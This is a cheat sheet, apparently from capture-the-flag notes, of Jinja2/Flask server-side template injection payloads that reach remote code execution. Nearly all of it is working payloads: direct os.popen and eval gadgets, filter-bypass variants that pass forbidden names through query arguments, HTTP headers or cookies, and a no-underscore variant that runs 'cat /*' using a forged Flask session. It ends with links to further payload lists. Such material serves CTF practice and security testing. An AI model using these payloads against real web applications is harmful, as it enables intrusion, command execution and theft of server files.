# Jinja2 & Flask

## The simplest payloads to achieve RCE

```py
{{cycler.__init__.__globals__["os"].popen("ls").read()}}
{{self.__init__.__globals__.__builtins__["eval"]("set(open(''/flag'))")}}
{{().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["eval"]("set(open('/flag'))")}}
```

## No dots, no attr, no |, no 'flag', no subclasses, no globals, no `__class__`, no mro

```py
# http://localhost:1337/?c=__class__&s=__subclasses__&b=__globals__&bb=__builtins__&cmd=set(open(%22/flag.txt%22))

{{(()[request["args"]["c"]][request["args"]["c"]][request["args"]["s"]](()[request["args"]["c"]][request["args"]["c"]])[0]["register"])[request["args"]["b"]][request["args"]["bb"]]["eval"](request["args"]["cmd"])}}
```

## No dots, no attr, no |, no 'flag', no subclasses, no globals, no args, no mro, no `__class__`, idk what to put anymore

```http
GET /?q={{(()[request["headers"]["c"]][request["headers"]["c"]][request["headers"]["c"]][request["headers"]["c"]][request["headers"]["c"]][request["headers"]["s"]](()[request["headers"]["c"]][request["headers"]["c"]][request["headers"]["c"]][request["headers"]["c"]])[0]["register"])[request["headers"]["b"]][request["headers"]["bb"]]["eval"](request["headers"]["cmd"])}} HTTP/1.1
Host: localhost:1337
c:__class__
s:__subclasses__
b:__globals__
bb:__builtins__
cmd:set(open("/flag"))
Connection: close
```
(You can also use cookies)

## No dots, no attr, no {{, no _, no [, with known app.secret_key

```py
{%with a=session|first%}{%print(request|attr("application")|attr(a%2b"globals"%2ba))|attr(a%2b"getitem"+%2ba)("json")|attr("codecs")|attr("sys")|attr("modules")|attr(a%2b"getitem"+%2ba)("os")|attr("popen")("cat /*")|attr("read")()%}{%endwith%}

# session=.eJwljrsOwjAMAP8lM4Pjxq7Dz1SOH6ISMLRiQvw7QYx3uuHeZdvKtZRL2fKI81auqfczJu4-vTmqMYzBmdEcmhpxrziYwZxkKgdiSl1VOksIax1RpRmuC0qQkiFFB264Bgu6WGp3cXRAHNBmMrp6JSdVU6lh7m3hSDD6fb3OOP436o_9WT5fNWU0Sw.ZhpIWQ.OLbcuOplfe801xPDpiwJ-WC-zR4
```

Other payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass

Forcing output on blind RCE: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---forcing-output-on-blind-rce
